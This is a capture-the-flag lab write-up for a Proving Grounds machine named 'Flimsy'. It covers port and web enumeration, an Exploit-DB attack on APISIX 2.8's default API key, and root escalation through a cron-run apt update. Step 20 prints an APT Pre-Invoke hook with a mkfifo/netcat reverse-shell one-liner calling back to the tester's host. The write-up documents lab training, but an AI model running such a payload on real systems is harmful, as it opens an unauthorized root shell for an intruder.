---
tags: [ProvingGround]
---

5/10/25

Flimsy

-------------------------

## 1. nmap -sV -sC -oN nmap/specifc -p 22,80,3306,8080,43500 192.168.208.220

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open   mysql      MySQL (unauthorized)
8080/tcp  closed http-proxy
43500/tcp open   http       OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. Nginx Website on port 80
## 3. 192.168.208.220:8080 unreachable
## 4. 192.168.208.220:43500 {"error_msg":"404 Route Not Found"}
## 5. Ran Nikto

+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

## 6. Received the following when I tried to connect to open MySql port:

mysql -h 192.168.208.220 -P 3306
WARNING: option --ssl-verify-server-cert is disabled, because of an insecure passwordless login.
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.235' is not allowed to connect to this MySQL server

## 7. gobuster dir -u http://192.168.208.220/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 302,404

/img                  (Status: 301) [Size: 178] [--> http://192.168.208.220/img/]
/css                  (Status: 301) [Size: 178] [--> http://192.168.208.220/css/]
/js                   (Status: 301) [Size: 178] [--> http://192.168.208.220/js/]
/slick                (Status: 301) [Size: 178] [--> http://192.168.208.220/slick/]
Progress: 220559 / 220560 (100.00%)

## 8. gobuster dir -u http://192.168.208.220/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,bak,conf,txt,zip,sql,inc -b 302,404

/index.html           (Status: 200) [Size: 50895]
/.                    (Status: 200) [Size: 50895]

## 9. wfuzz --sc 302 -u http://192.168.208.220/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt - Nothing returned.
## 10. wfuzz --sc 302 -u http://192.168.208.220:43500/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt - Nothing returned.
## 11. wfuzz --sc 302 -u http://192.168.208.220:43500/FUZZ -w /usr/share/wordlists/wfuzz/general/big.txt - Nothing returned.
## 12. gobuster dir -u http://192.168.208.220:43500/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 302,404
## 13. Ran SQLMAP - No vulnerable inputs

sqlmap -u "http://192.168.208.220/" \
--method POST \
--data="name=Ryan&email=ryan@go.com&inquiry=sales&message=Test" \
--batch --level=3 --risk=2

## 13. Began looking at 43500/tcp open   http       OpenResty web app server |_http-server-header: APISIX/2.8
## 14. Version is vulnerable to default master API key and IP restriction bybass.
## 15. Executed exploit found on exploit DB https://www.exploit-db.com/exploits/50829
## 16. Foothold found with user franklin.
## 17. cat /etc/crontab
## 18. Notice apt get update is running as root.
## 19. Google apt get update priv esculation - https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
## 20. echo 'APT::Update::Pre-Invoke {"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.235 4445 >/tmp/f";};' > pwn
## 21. nc -nvlp 4445